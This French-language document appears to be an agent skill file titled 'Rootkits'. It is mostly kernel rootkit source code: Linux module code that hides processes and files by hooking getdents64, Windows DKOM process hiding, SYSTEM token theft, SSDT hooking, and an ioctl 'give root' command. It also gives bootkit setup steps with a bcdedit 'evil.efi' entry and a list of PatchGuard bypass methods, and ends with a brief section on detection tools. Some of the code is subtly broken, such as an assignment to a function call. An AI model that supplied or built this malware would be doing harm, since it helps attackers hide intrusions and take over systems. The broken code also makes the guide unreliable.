---
name: rootkits
description: Rootkits — LKM kernel modules, DKOM, SSDT hooking, syscall table, IDT hooks, bootkits, UEFI, hypervisors, et détection de rootkits
tags: [rootkit, kernel, LKM, DKOM, SSDT, hook, bootkit, UEFI, hypervisor, detection]
version: 1.0
---

# Rootkits

Guide de développement et analyse de rootkits — du kernel mode aux bootkits UEFI, techniques de persistance et invisibilité.

## 1. Linux Kernel Modules (LKM)

### Module Basique
```c
// hello_rootkit.c — LKM minimal
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>

MODULE_LICENSE("GPL");
MODULE_AUTHOR("EVA");
MODULE_DESCRIPTION("Basic rootkit module");

static int __init rootkit_init(void) {
    printk(KERN_INFO "[RK] Rootkit loaded\n");
    return 0;
}

static void __exit rootkit_exit(void) {
    printk(KERN_INFO "[RK] Rootkit unloaded\n");
}

module_init(rootkit_init);
module_exit(rootkit_exit);
```

```bash
# Compiler
make -C /lib/modules/$(uname -r)/build M=$(pwd) modules
# Charger
insmod rootkit.ko
# Vérifier
lsmod | grep rootkit
# Décharger
rmmod rootkit
```

### Hide Process (LKM)
```c
// Modifier la liste chaînée des processus
// Retirer un PID de la liste

static int hide_process(pid_t pid) {
    struct task_struct *task;
    struct list_head *list;
    
    for_each_process(task) {
        if (task->pid == pid) {
            // Retirer de la liste des tâches
            list_del(&task->tasks);
            // Retirer du hash table
            hash_del(&task->pid_links);
            return 0;
        }
    }
    return -ESRCH;
}
```

### File Hiding (LKM)
```c
// Hook sys_getdents64 → filtrer fichiers
// Intercepter et supprimer les entrées sensibles

asmlinkage long (*real_getdents64)(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);

asmlinkage long fake_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
    long ret = real_getdents64(fd, dirp, count);
    if (ret <= 0) return ret;
    
    // Parcourir et filtrer
    struct linux_dirent64 *d, *prev = NULL;
    int offset = 0;
    char *buf = (char *)dirp;
    
    while (offset < ret) {
        d = (struct linux_dirent64 *)(buf + offset);
        if (strstr(d->d_name, "evil") || strstr(d->d_name, "rootkit")) {
            // Supprimer l'entrée
            int reclen = d->d_reclen;
            if (prev) {
                prev->d_reclen += reclen;
            } else {
                memmove(buf, buf + reclen, ret - reclen);
                ret -= reclen;
                continue;
            }
        }
        prev = d;
        offset += d->d_reclen;
    }
    return ret;
}
```

## 2. DKOM (Direct Kernel Object Manipulation)

### Windows — Hide Process
```c
// EPROCESS manipulation
// Retirer du ActiveProcessLinks list

typedef struct _EPROCESS {
    // ...
    LIST_ENTRY ActiveProcessLinks;  // Offset varies by version
    // ...
    HANDLE UniqueProcessId;
    // ...
} EPROCESS, *PEPROCESS;

void hide_process(PEPROCESS target) {
    PLIST_ENTRY prev = target->ActiveProcessLinks.Blink;
    PLIST_ENTRY next = target->ActiveProcessLinks.Flink;
    
    // Retirer de la liste doublement chaînée
    prev->Flink = next;
    next->Blink = prev;
    
    // Option : boucler sur soi-même
    target->ActiveProcessLinks.Flink = &target->ActiveProcessLinks;
    target->ActiveProcessLinks.Blink = &target->ActiveProcessLinks;
}
```

### Token Elevation
```c
// Modifier le token SYSTEM d'un processus
// Copier le token d'un processus SYSTEM (PID 4)

void steal_token(PEPROCESS target) {
    HANDLE systemToken;
    HANDLE targetToken;
    
    // Copier le token du processus SYSTEM
    systemToken = PsGetProcessToken(PsInitialSystemProcess);
    targetToken = PsGetProcessToken(target);
    
    // Modifier pointeur
    PsGetProcessToken(target) = systemToken;
}
```

## 3. SSDT Hooking (Windows)

```c
// System Service Descriptor Table hook
// Intercepter les appels système

// Trouver KiServiceTable
// Patcher l'entrée du syscall

// Exemple : hook NtQuerySystemInformation
// (utilisé pour lister les processus)

typedef NTSTATUS (*NTQUERYSYSTEMINFORMATION)(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
);

NTQUERYSYSTEMINFORMATION OriginalNtQSI = NULL;

NTSTATUS HookedNtQSI(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
) {
    NTSTATUS status = OriginalNtQSI(
        SystemInformationClass, SystemInformation,
        SystemInformationLength, ReturnLength
    );
    
    // Filtrer les résultats
    if (SystemInformationClass == SystemProcessInformation) {
        // Supprimer les entrées de processus cachés
    }
    return status;
}
```

## 4. IDT Hooking (Interrupt Descriptor Table)

```c
// Hooker les interruptions
// Int 0x2E (syscall legacy) ou int 0x80 (Linux)

// Remplacer le handler dans l'IDT
// Dangereux : peut causer des BSODs
// Préférer SSDT ou syscall table hook
```

## 5. Rootkit Communication

### IOCTL (Linux)
```c
// Communication userspace ↔ kernelspace via ioctl
static long rootkit_ioctl(struct file *file, unsigned int cmd, unsigned long arg) {
    switch (cmd) {
        case RK_HIDE_PID:
            hide_process((pid_t)arg);
            break;
        case RK_SHOW_PID:
            show_process((pid_t)arg);
            break;
        case RK_GET_ROOT:
            give_root();
            break;
    }
    return 0;
}

static struct file_operations fops = {
    .unlocked_ioctl = rootkit_ioctl,
};
```

### Hidden TCP Port
```c
// Hook inet_show / tcp4_seq_show
// Filtrer les ports cachés des listings

// Exemple : hook tcp4_seq_show()
// Ne pas afficher les lignes avec le port C2
```

## 6. Bootkits

### MBR Bootkit
```asm
; Infecter le Master Boot Record
; 1. Lire le MBR original
; 2. Écrire le bootkit dans le MBR
; 3. Bootkit charge le vrai MBR ailleurs
; 4. Bootkit s'installe en mémoire
; 5. Pivot vers le VBR (Volume Boot Record)
```

### UEFI Bootkit
```c
// UEFI firmware modification
// - NVRAM variables
// - BootOrder modification
// - DXE driver injection
// - SMM (System Management Mode) hooking

// UEFI persistence
// 1. Bootkit dans SPI flash
// 2. Load option UEFI
// 3. DXE driver (early boot)
// 4. SMM (undetectable by OS)

// Exemple : UEFI persistence via boot option
// bcdedit /copy {current} /d "EvilBoot"
// bcdedit /set {guid} path \windows\system32\boot\evil.efi
```

## 7. Hypervisor Rootkits (Ring -1)

```c
// Type II hypervisor (Blue Pill, SubVirt)
// Hôte : Windows/Linux
// Invité : OS original
// Rootkit s'exécute sous le VMM (Ring -1)

// Détection :
// - CPUID timing differences
// - Red Pill, SVM detection
// - VM-exit checking
// - TSC (Time Stamp Counter) skew
```

## 8. Anti-Detection

### KPP (Kernel Patch Protection — PatchGuard)
```c
// Windows 64-bit : PatchGuard protège :
// - SSDT (KeServiceDescriptorTable)
// - IDT (InterruptDescriptorTable)
// - GDT (GlobalDescriptorTable)
// - Kernel modules
// - MSR (Model Specific Registers)

// Bypass techniques :
// 1. PatchGuard disable (old)
// 2. Physical memory access (\\.\PhysicalMemory)
// 3. Direct hardware access (IO ports)
// 4. Hypervisor-based (hook before PatchGuard check)
// 5. Custom SSDT (KeAddSystemServiceTable)
```

### Kernel Integrity Check Bypass
```c
// Linux : kprobes, ftrace, jprobes
// Modern kernels verifient integrity

// Techniques :
// 1. kprobes-based hooking (legitimate)
// 2. ftrace handler (legitimate API)
// 3. kallsyms_lookup_name (if available)
// 4. Direct memory write (CR0.WP disable)
```

## 9. Rootkit Detection

### Linux
```bash
# Recherche de rootkits
rkhunter --check
chkrootkit
lsof -p <pid>  # Vérifier fichiers ouverts
cat /proc/<pid>/maps  # Mémoire du processus
lsmod | grep -v "^Module"  # Modules suspects
dmesg | grep -i "loaded"
```

### Windows
```bash
# RootkitRevealer (Sysinternals)
# GMER : scanner SSDT/IDT/process
# Process Hacker : vérifier handles
# WinDbg : !process 0 0
# Autoruns : persistence check
# Sysinternals : rootkit detection
```

## 10. Tools Compendium

| Catégorie | Outil | Usage |
|-----------|-------|-------|
| **Develop** | LD_PRELOAD | Userland hook |
| **Develop** | DKOM library | Kernel object manipulation |
| **Develop** | Windows WDK | Kernel driver dev |
| **Develop** | Eclipse | Linux kernel module dev |
| **Detect** | chkrootkit | Linux rootkit detection |
| **Detect** | rkhunter | Linux rootkit detection |
| **Detect** | GMER | Windows rootkit detection |
| **Detect** | Sysinternals | Windows utilities |
| **Detect** | Volatility | Memory analysis |
| **Bootkit** | UEFITool | Firmware analysis |
| **Bootkit** | Chipsec | Platform security |

## 11. Ressources

- **Linux Device Drivers** : O'Reilly book
- **Windows Internals** : Pavel Yosifovich, Mark Russinovich
- **Rootkit Arsenal** : Bill Blunden
- **The Rootkit Arsenal** : 2nd edition
- **Phrack Magazine** : http://phrack.org (rootkit articles)
- **Valhalla** : Rootkit detection
- **Chipsec** : https://github.com/chipsec/chipsec
- **UEFI Bootkit** : https://github.com/SamuelTulach/rainbow
- **Volatility 3** : Rootkit detection plugins